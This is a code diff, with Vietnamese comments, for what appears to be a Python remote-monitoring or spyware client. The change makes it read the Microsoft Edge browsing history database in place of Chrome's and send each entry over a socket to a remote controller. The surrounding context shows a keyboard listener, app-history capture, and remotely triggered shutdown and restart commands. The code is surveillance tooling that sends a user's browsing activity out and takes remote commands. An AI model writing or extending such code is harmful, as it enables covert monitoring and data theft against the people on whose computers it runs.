@@ -90,9 +90,9 @@ def getAppHistory():
         current_apps = running_apps
         
         time.sleep(1)
-def get_chrome_history():
-    # Đường dẫn đến cơ sở dữ liệu lịch sử của Google Chrome
-    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
+def get_edge_history():
+    # Đường dẫn đến cơ sở dữ liệu lịch sử của Microsoft Edge
+    data_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default'
     history_db = os.path.join(data_path, 'History')
 
     # Kết nối đến cơ sở dữ liệu lịch sử
@@ -105,14 +105,15 @@ def get_chrome_history():
         history = cursor.fetchall()
 
         for row in history:
-            print(row)
-            clientSocket.send(row.encode('utf-8'))
+            web = "Open web : {}".format(row)
+            print(web) 
+            clientSocket.send(web.encode('utf-8'))
+            
+        connection.close()       
 
     except sqlite3.OperationalError as e:
         print(e)
-    finally:
-        # Đóng kết nối
-        connection.close()       
+            
 with Listener(on_press=on_press) as parent:
     try:
         while True:
@@ -123,7 +124,7 @@ with Listener(on_press=on_press) as parent:
             elif message == 'appHistory':
                 getAppHistory()
             elif message == 'webHistory':
-                get_chrome_history()    
+                get_edge_history()    
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
